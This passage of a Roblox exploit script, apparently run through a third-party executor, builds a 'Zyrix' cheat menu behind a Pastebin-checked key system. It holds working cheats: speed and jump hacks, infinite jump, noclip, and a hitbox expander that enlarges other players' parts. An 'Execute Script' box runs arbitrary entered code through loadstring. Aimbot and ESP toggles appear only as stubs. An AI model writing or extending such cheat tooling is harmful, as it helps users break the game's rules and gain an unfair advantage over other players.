            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })

        local keyPill = frame({
            Size = UDim2.new(0,70,0,24),
            Position = UDim2.new(1,-80,0.5,0),
            AnchorPoint = Vector2.new(0,0.5),
            BackgroundColor3 = UI_T.BG,
            Parent = el,
        })
        corner(keyPill, CORNER2) stroke(keyPill, UI_T.Stroke, 1, 0)

        local keyLbl = label({
            Size = UDim2.new(1,0,1,0),
            Text = key == Enum.KeyCode.Unknown and "None" or tostring(key):gsub("Enum.KeyCode.",""),
            TextColor3 = UI_T.AccentDim,
            TextSize = 11, Parent = keyPill,
        })

        local clickBtn3 = btn({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=el})
        local conn
        clickBtn3.MouseButton1Click:Connect(function()
            if listening then return end
            listening = true
            keyLbl.Text = "..."
            tw(keyPill,0.1,{BackgroundColor3=UI_T.Element})
            conn = UIS.InputBegan:Connect(function(i, gp)
                if gp then return end
                if i.UserInputType == Enum.UserInputType.Keyboard then
                    key = i.KeyCode
                    keyLbl.Text = tostring(key):gsub("Enum.KeyCode.","")
                    tw(keyPill,0.1,{BackgroundColor3=UI_T.BG})
                    listening = false
                    if conn then conn:Disconnect() end
                    if callback then pcall(callback, key) end
                end
            end)
        end)
        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)
        return {GetValue=function() return key end}
    end

    -- ── Color picker (simple B&W lightness slider) ────────────────────────────
    local function addColorPicker(scroll, title, default, callback, lo)
        local value = default or Color3.fromRGB(255,255,255)
        local el = frame({
            Size = UDim2.new(1,0,0,52),
            BackgroundColor3 = UI_T.Element,
            LayoutOrder = lo or 0,
            Parent = scroll,
        })
        corner(el) stroke(el, UI_T.Stroke, 1, 0)

        label({
            Size = UDim2.new(0.6,0,0,20),
            Position = UDim2.new(0,12,0,8),
            Text = title, TextColor3 = UI_T.Text,
            TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
            Parent = el,
        })

        local preview = frame({
            Size = UDim2.new(0,22,0,22),
            Position = UDim2.new(1,-34,0.5,0),
            AnchorPoint = Vector2.new(0,0.5),
            BackgroundColor3 = value,
            Parent = el,
        })
        corner(preview, CORNER2) stroke(preview, UI_T.Stroke, 1, 0)

        -- lightness track
        local track2 = frame({
            Size = UDim2.new(1,-24,0,4),
            Position = UDim2.new(0,12,0,36),
            BackgroundColor3 = UI_T.Slider_BG,
            Parent = el,
        })
        corner(track2, UDim.new(1,0))
        -- gradient: black → white
        local grad = Instance.new("UIGradient", track2)
        grad.Color = ColorSequence.new(Color3.new(0,0,0), Color3.new(1,1,1))

        local lum = (value.R + value.G + value.B) / 3
        local knob2 = frame({
            Size = UDim2.new(0,12,0,12),
            Position = UDim2.new(lum,0,0.5,0),
            AnchorPoint = Vector2.new(0.5,0.5),
            BackgroundColor3 = UI_T.Accent,
            Parent = track2,
        })
        corner(knob2, UDim.new(1,0))

        local dragging2 = false
        local hitbox2 = btn({Size=UDim2.new(1,0,0,24),Position=UDim2.new(0,0,0,26),BackgroundTransparency=1,Parent=el})
        local function updateColor(xPos)
            local rel = math.clamp((xPos - track2.AbsolutePosition.X) / track2.AbsoluteSize.X, 0, 1)
            lum = rel
            value = Color3.new(rel,rel,rel)
            knob2.Position = UDim2.new(rel,0,0.5,0)
            preview.BackgroundColor3 = value
            if callback then pcall(callback, value) end
        end
        hitbox2.InputBegan:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                dragging2=true updateColor(i.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(i)
            if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging2=false end
        end)
        UIS.InputChanged:Connect(function(i)
            if not dragging2 then return end
            if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                updateColor(i.Position.X)
            end
        end)
        el.MouseEnter:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.ElementHov}) end)
        el.MouseLeave:Connect(function() tw(el,0.15,{BackgroundColor3=UI_T.Element}) end)
        return {GetValue=function() return value end}
    end

    -- ── Notification (in-GUI) ─────────────────────────────────────────────────
    local notifHolder = nil
    local function uiNotify(title, msg, dur)
        if not notifHolder then return end
        dur = dur or 3
        local n = frame({
            Size=UDim2.new(1,0,0,0),
            AutomaticSize=Enum.AutomaticSize.Y,
            BackgroundColor3=UI_T.Element,
            Parent=notifHolder,
        })
        corner(n) stroke(n,UI_T.Stroke,1,0)
        local lyt = Instance.new("UIListLayout",n) lyt.Padding=UDim.new(0,2)
        pad(n,8,8,10,10)
        label({Size=UDim2.new(1,0,0,16),Text=title,TextColor3=UI_T.Text,TextSize=12,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=n})
        label({Size=UDim2.new(1,0,0,14),Text=msg,TextColor3=UI_T.TextDim,TextSize=10,Font=FONT,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=2,Parent=n})
        tw(n,0.3,{BackgroundColor3=UI_T.ElementHov})
        task.delay(dur,function()
            tw(n,0.3,{BackgroundColor3=UI_T.BG})
            task.wait(0.3) if n and n.Parent then n:Destroy() end
        end)
    end

    -- ════════════════════════════════════════════════════════════════════════
    --  ZyrixUI:Open()  —  builds and shows the window
    -- ════════════════════════════════════════════════════════════════════════
    function ZyrixUI:Open()
        if guiRef then guiRef:Destroy() guiRef=nil end
        tabButtons = {} tabPanels = {} currentTab = nil

        local sg = Instance.new("ScreenGui")
        sg.Name="ZyrixMainUI" sg.ResetOnSpawn=false
        sg.IgnoreGuiInset=true sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
        sg.DisplayOrder=20 sg.Parent=hui
        guiRef = sg

        -- ── root window ────────────────────────────────────────────────────
        local win = frame({
            Name="Window",
            Size=UDim2.new(0,WIN_W,0,WIN_H),
            Position=UDim2.new(0.5,0,0.5,0),
            AnchorPoint=Vector2.new(0.5,0.5),
            BackgroundColor3=UI_T.BG,
            Parent=sg,
        })
        corner(win, UDim.new(0,8))
        stroke(win, UI_T.Stroke, 1.5, 0)

        -- ── title bar ──────────────────────────────────────────────────────
        local titleBar = frame({
            Size=UDim2.new(1,0,0,44),
            BackgroundColor3=UI_T.Sidebar,
            Parent=win,
        })
        corner(titleBar, UDim.new(0,8))
        -- fix bottom corners of titlebar
        frame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=UI_T.Sidebar,BorderSizePixel=0,Parent=titleBar})
        frame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=UI_T.Stroke,BorderSizePixel=0,Parent=titleBar})

        img({
            Size=UDim2.new(0,22,0,22),
            Position=UDim2.new(0,12,0.5,0), AnchorPoint=Vector2.new(0,0.5),
            Image=Zyrix.Appearance.Icon, ImageColor3=UI_T.Text,
            Parent=titleBar,
        })
        label({
            Size=UDim2.new(1,-160,1,0),
            Position=UDim2.new(0,40,0,0),
            Text=Zyrix.Appearance.Title,
            TextColor3=UI_T.Text, TextSize=16,
            TextXAlignment=Enum.TextXAlignment.Left,
            Parent=titleBar,
        })

        -- window controls
        local function winCtrlBtn(xOff, col, hoverCol, symbol)
            local b = btn({
                Size=UDim2.new(0,26,0,26),
                Position=UDim2.new(1,xOff,0.5,0),
                AnchorPoint=Vector2.new(1,0.5),
                BackgroundColor3=UI_T.Element,
                Parent=titleBar,
            })
            corner(b, UDim.new(1,0))
            label({Size=UDim2.new(1,0,1,0),Text=symbol,TextColor3=col,TextSize=13,Parent=b})
            b.MouseEnter:Connect(function() tw(b,0.1,{BackgroundColor3=hoverCol}) end)
            b.MouseLeave:Connect(function() tw(b,0.1,{BackgroundColor3=UI_T.Element}) end)
            return b
        end

        local closeWin  = winCtrlBtn(-10,  UI_T.Danger,   Color3.fromRGB(80,20,20),  "✕")
        local minifyWin = winCtrlBtn(-42,  UI_T.TextDim,  UI_T.ElementHov,           "−")

        local minimized = false
        local contentArea -- forward ref
        minifyWin.MouseButton1Click:Connect(function()
            minimized = not minimized
            if minimized then
                tw(win,0.3,{Size=UDim2.new(0,WIN_W,0,44)})
            else
                tw(win,0.3,{Size=UDim2.new(0,WIN_W,0,WIN_H)})
            end
        end)
        closeWin.MouseButton1Click:Connect(function()
            tw(win,0.25,{Size=UDim2.new(0,WIN_W,0,0), BackgroundTransparency=1})
            task.wait(0.28) sg:Destroy() guiRef=nil
        end)

        makeDraggable(titleBar, win)

        -- ── body (sidebar + content) ────────────────────────────────────────
        local body = frame({
            Size=UDim2.new(1,0,1,-44),
            Position=UDim2.new(0,0,0,44),
            BackgroundTransparency=1,
            Parent=win,
        })

        -- sidebar
        local sidebar = frame({
            Size=UDim2.new(0,SIDEBAR_W,1,0),
            BackgroundColor3=UI_T.Sidebar,
            Parent=body,
        })
        -- fix right edge
        frame({Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),BackgroundColor3=UI_T.Stroke,BorderSizePixel=0,Parent=sidebar})

        local sideScroll = scrollFrame(sidebar, UDim2.new(1,0,1,-10), UDim2.new(0,0,0,8))
        sideScroll.ScrollBarThickness = 0
        listLayout(sideScroll, 2)
        pad(sideScroll, 2, 2, 6, 6)

        -- content area
        contentArea = frame({
            Size=UDim2.new(1,-SIDEBAR_W,1,0),
            Position=UDim2.new(0,SIDEBAR_W,0,0),
            BackgroundColor3=UI_T.Panel,
            Parent=body,
        })

        -- notification pane (top-right inside content)
        notifHolder = frame({
            Size=UDim2.new(0,200,0,0),
            Position=UDim2.new(1,-208,0,8),
            AnchorPoint=Vector2.new(0,0),
            AutomaticSize=Enum.AutomaticSize.Y,
            BackgroundTransparency=1,
            ZIndex=20,
            Parent=contentArea,
        })
        local nhl = Instance.new("UIListLayout",notifHolder)
        nhl.Padding=UDim.new(0,4) nhl.SortOrder=Enum.SortOrder.LayoutOrder
        nhl.VerticalAlignment=Enum.VerticalAlignment.Top

        -- ── tab builder helper ──────────────────────────────────────────────
        local tabLO = 0
        local function addTab(name, iconText)
            tabLO = tabLO + 1

            -- sidebar button
            local tbBG = frame({
                Size=UDim2.new(1,0,0,TAB_H),
                BackgroundColor3=Color3.fromRGB(0,0,0),
                LayoutOrder=tabLO,
                Parent=sideScroll,
            })
            corner(tbBG, CORNER2)

            -- active indicator bar
            local ind = frame({
                Size=UDim2.new(0,3,0.55,0),
                Position=UDim2.new(0,0,0.5,0),
                AnchorPoint=Vector2.new(0,0.5),
                BackgroundColor3=UI_T.Accent,
                BackgroundTransparency=1,
                BorderSizePixel=0,
                Parent=tbBG,
            })
            corner(ind, UDim.new(1,0))

            local tbLbl = label({
                Size=UDim2.new(1,-10,1,0),
                Position=UDim2.new(0,14,0,0),
                Text=(iconText and (iconText.." ") or "")..name,
                TextColor3=UI_T.TextDim, TextSize=13,
                TextXAlignment=Enum.TextXAlignment.Left,
                Parent=tbBG,
            })

            local tbClick = btn({Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Parent=tbBG})
            tbClick.MouseButton1Click:Connect(function() switchTab(name) end)
            tbBG.MouseEnter:Connect(function()
                if currentTab~=name then tw(tbBG,0.15,{BackgroundColor3=UI_T.Element}) end
            end)
            tbBG.MouseLeave:Connect(function()
                if currentTab~=name then tw(tbBG,0.15,{BackgroundColor3=Color3.fromRGB(0,0,0)}) end
            end)
            tabButtons[name] = {bg=tbBG, ind=ind, lbl=tbLbl}

            -- content panel
            local panel = frame({
                Size=UDim2.new(1,0,1,0),
                BackgroundTransparency=1,
                Visible=false,
                Parent=contentArea,
            })
            local panelScroll = scrollFrame(panel, UDim2.new(1,-8,1,-8), UDim2.new(0,4,0,4))
            listLayout(panelScroll, 6)
            pad(panelScroll, 4, 8, 4, 4)

            tabPanels[name] = panel

            -- if first tab, activate it
            if tabLO == 1 then switchTab(name) end

            -- return helpers scoped to this tab
            local lo = 0
            local function nextLO() lo=lo+1 return lo end
            return {
                Section   = function(t)           addSection(panelScroll, t) end,
                Toggle    = function(t,d,def,cb)   return addToggle(panelScroll,t,d,def,cb,nextLO()) end,
                Slider    = function(t,mn,mx,def,cb) return addSlider(panelScroll,t,mn,mx,def,cb,nextLO()) end,
                Button    = function(t,d,cb)        addButton(panelScroll,t,d,cb,nextLO()) end,
                TextBox   = function(t,ph,def,cb)   return addTextBox(panelScroll,t,ph,def,cb,nextLO()) end,
                Dropdown  = function(t,opts,def,cb) return addDropdown(panelScroll,t,opts,def,cb,nextLO()) end,
                Keybind   = function(t,def,cb)      return addKeybind(panelScroll,t,def,cb,nextLO()) end,
                ColorPicker=function(t,def,cb)      return addColorPicker(panelScroll,t,def,cb,nextLO()) end,
                Notify    = function(t,m,d)          uiNotify(t,m,d) end,
            }
        end

        -- separator in sidebar
        local function addSideLabel(text)
            tabLO = tabLO + 1
            local lbl2 = label({
                Size=UDim2.new(1,0,0,22),
                Text=text:upper(), TextColor3=UI_T.TextOff,
                TextSize=9, TextXAlignment=Enum.TextXAlignment.Left,
                LayoutOrder=tabLO, Parent=sideScroll,
            })
            pad(lbl2, 0, 0, 8, 0)
        end

        -- ── expose AddTab/AddSideLabel as public methods ────────────────────
        ZyrixUI.AddTab       = addTab
        ZyrixUI.AddSideLabel = addSideLabel

        -- ── run user setup if queued via ZyrixUI:Setup(fn) ───────────────────
        if ZyrixUI._pendingSetup then
            ZyrixUI._pendingSetup()
            ZyrixUI._pendingSetup = nil
        end

        -- ── build default tabs ──────────────────────────────────────────────

        -- PLAYER
        local player = addTab("Player", "👤")
        player.Section("Movement")
        player.Toggle("Speed Hack", "Increase walkspeed", false, function(v)
            local lp = cloneref(Players.LocalPlayer)
            if lp and lp.Character and lp.Character:FindFirstChild("Humanoid") then
                lp.Character.Humanoid.WalkSpeed = v and 50 or 16
            end
        end)
        player.Slider("Walk Speed", 16, 200, 16, function(v)
            local lp = cloneref(Players.LocalPlayer)
            if lp and lp.Character and lp.Character:FindFirstChild("Humanoid") then
                lp.Character.Humanoid.WalkSpeed = v
            end
        end)
        player.Slider("Jump Power", 50, 500, 50, function(v)
            local lp = cloneref(Players.LocalPlayer)
            if lp and lp.Character and lp.Character:FindFirstChild("Humanoid") then
                lp.Character.Humanoid.JumpPower = v
            end
        end)
        player.Section("Character")
        player.Toggle("Infinite Jump", "Jump while in the air", false, function(v)
            getgenv().ZyrixInfJump = v
            if v and not getgenv().ZyrixInfJumpConn then
                getgenv().ZyrixInfJumpConn = UIS.JumpRequest:Connect(function()
                    if not getgenv().ZyrixInfJump then return end
                    local lp = cloneref(Players.LocalPlayer)
                    if lp and lp.Character and lp.Character:FindFirstChild("Humanoid") then
                        lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end)
            end
        end)
        player.Toggle("Noclip", "Walk through walls", false, function(v)
            getgenv().ZyrixNoclip = v
            if v and not getgenv().ZyrixNoclipConn then
                getgenv().ZyrixNoclipConn = RS.Stepped:Connect(function()
                    if not getgenv().ZyrixNoclip then return end
                    local lp = cloneref(Players.LocalPlayer)
                    if lp and lp.Character then
                        for _, p in ipairs(lp.Character:GetDescendants()) do
                            if p:IsA("BasePart") then p.CanCollide = false end
                        end
                    end
                end)
            end
        end)

        addSideLabel("combat")
        -- COMBAT
        local combat = addTab("Combat", "⚔️")
        combat.Section("Aimbot")
        combat.Toggle("Aimbot", "Auto-aim at players", false, function(v)
            -- add your aimbot logic here
        end)
        combat.Slider("Smoothness", 1, 100, 50, function(v)
            -- add your smoothness logic here
        end)
        combat.Slider("FOV", 10, 500, 120, function(v)
            -- add your FOV logic here
        end)
        combat.Section("Hitbox")
        combat.Toggle("Hitbox Expander", "Expand player hitboxes", false, function(v)
            getgenv().ZyrixHitbox = v
            if v and not getgenv().ZyrixHitboxConn then
                getgenv().ZyrixHitboxConn = RS.Stepped:Connect(function()
                    if not getgenv().ZyrixHitbox then return end
                    for _, p in ipairs(Players:GetPlayers()) do
                        if p ~= Players.LocalPlayer and p.Character then
                            for _, part in ipairs(p.Character:GetDescendants()) do
                                if part:IsA("BasePart") then part.Size = Vector3.new(6,6,6) end
                            end
                        end
                    end
                end)
            end
        end)

        addSideLabel("visuals")
        -- VISUAL
        local visual = addTab("Visual", "👁️")
        visual.Section("ESP")
        visual.Toggle("Player ESP", "Show player boxes", false, function(v)
            -- add your ESP logic here
        end)
        visual.Toggle("Name Tags", "Show player names", false, function(v)
            -- add your nametag logic here
        end)
        visual.Toggle("Health Bars", "Show health bars", false, function(v)
            -- add your health bar logic here
        end)
        visual.Section("World")
        visual.Toggle("Fullbright", "Max ambient lighting", false, function(v)
            Lighting.Brightness = v and 2 or 1
            Lighting.ClockTime  = v and 14 or tonumber(os.date("%H"))
        end)
        visual.Toggle("No Fog", "Remove fog from world", false, function(v)
            Lighting.FogEnd = v and 1e6 or 100000
        end)

        addSideLabel("misc")
        -- MISC
        local misc = addTab("Misc", "⚙️")
        misc.Section("General")
        misc.Button("Rejoin", "Reconnect to current server", function()
            local lp = cloneref(Players.LocalPlayer)
            game:GetService("TeleportService"):Teleport(game.PlaceId, lp)
        end)
        misc.Button("Copy Game ID", nil, function()
            pcall(setclipboard, tostring(game.PlaceId))
            uiNotify("Copied", "Game ID copied to clipboard", 2)
        end)
        misc.Dropdown("Executor Theme", {"Dark","Light","System"}, "Dark", function(v)
            -- theme logic here
        end)
        misc.Section("Scripts")
        misc.TextBox("Execute Script", "print('hello')", "", function(code)
            if code and code ~= "" then
                local ok, err = pcall(loadstring(code))
                if not ok then uiNotify("Error", tostring(err), 4)
                else uiNotify("Executed", "Script ran successfully", 2) end
            end
        end)
        misc.Keybind("Toggle GUI", Enum.KeyCode.RightShift, function(k)
            -- saved for keybind logic below
        end)

        addSideLabel("settings")
        -- SETTINGS
        local settings = addTab("Settings", "🔧")
        settings.Section("Interface")
        settings.Toggle("Show Watermark", "Display Zyrix watermark", true, function(v)
            local bgGui = hui:FindFirstChild("ZyrixBackground")
            if bgGui then
                local wm = bgGui:FindFirstChild("Frame") and bgGui.Frame:FindFirstChildOfClass("Frame")
                -- watermark visibility toggle
            end
        end)
        settings.Slider("UI Scale", 50, 150, 100, function(v)
            win.Size = UDim2.new(0, WIN_W*(v/100), 0, WIN_H*(v/100))
        end)
        settings.Section("Keybinds")
        settings.Keybind("Toggle UI", Enum.KeyCode.RightShift, function(k)
            getgenv().ZyrixToggleKey = k
        end)
        settings.Section("Account")
        settings.Button("Clear Saved Key", "Force re-enter key on next load", function()
            Zyrix:ClearSavedKey()
            uiNotify("Cleared", "Saved key removed", 2)
        end)

        -- ── global keybind to toggle window ────────────────────────────────
        getgenv().ZyrixToggleKey = getgenv().ZyrixToggleKey or Enum.KeyCode.RightShift
        UIS.InputBegan:Connect(function(i, gp)
            if gp then return end
            if i.KeyCode == getgenv().ZyrixToggleKey then
                win.Visible = not win.Visible
            end
        end)

        -- ── entrance animation ──────────────────────────────────────────────
        win.Size = UDim2.new(0, WIN_W, 0, 0)
        win.BackgroundTransparency = 1
        tw(win, 0.35, {Size=UDim2.new(0,WIN_W,0,WIN_H), BackgroundTransparency=0}, Enum.EasingStyle.Back)
    end

    function ZyrixUI:Close()
        if guiRef then guiRef:Destroy() guiRef=nil end
    end

    function ZyrixUI:Toggle()
        if guiRef then
            local win2 = guiRef:FindFirstChild("Window")
            if win2 then win2.Visible = not win2.Visible end
        end
    end

    -- Queue a setup function to run inside Open() after the window is built
    -- This lets users call ZyrixUI:AddTab() from their own OnSuccess callback
    function ZyrixUI:Setup(fn)
        self._pendingSetup = fn
    end
end

-- ═══════════════════════════════════════════════════════════════════════════════
--  CONFIGURATION — edit below to set up your script
-- ═══════════════════════════════════════════════════════════════════════════════

local cachedKeys = nil
local PASTEBIN_URL = "https://pastebin.com/raw/YOUR_PASTEBIN_ID"

Zyrix.Appearance.Title    = "Zyrix"
Zyrix.Appearance.Subtitle = "Enter your key to continue"

Zyrix.Links.GetKey  = PASTEBIN_URL
Zyrix.Links.Discord = "" -- "https://discord.gg/yourserver"

-- Pastebin key validation (supports multiple keys, one per line)
Zyrix.Callbacks.OnVerify = function(key)
    if not cachedKeys then
        local ok, result = pcall(game.HttpGet, game, PASTEBIN_URL)
        if not ok or not result then return false end
        cachedKeys = result
    end
    key = key:gsub("%s+", "")
    for _, line in ipairs(cachedKeys:split("\n")) do
        if line:gsub("%s+", "") == key then return true end
    end
    return false
end

-- Called when key is accepted — opens the main GUI
-- Override this in your own script with ZyrixUI:Setup(...) then ZyrixUI:Open()
Zyrix.Callbacks.OnSuccess = function()
    ZyrixUI:Open()
end

Zyrix.Callbacks.OnFail = function(err)
    print("Key failed:", err)
end

Zyrix.Callbacks.OnClose = function()
    print("Key system closed")
end

-- Changelog (optional — remove table entries to hide the changelog button)
Zyrix.Changelog = {
    -- { Version = "v1.0", Date = "Jun 2025", Changes = {"Initial release"} },
}

-- Shop panel (optional)
Zyrix.Shop.Enabled = false
-- Zyrix.Shop.Enabled  = true
-- Zyrix.Shop.Title    = "Get Premium Access"
-- Zyrix.Shop.Subtitle = "Instant delivery • 24/7 support"
-- Zyrix.Shop.Link     = "https://your-shop.com"

Zyrix:Launch()

return Zyrix
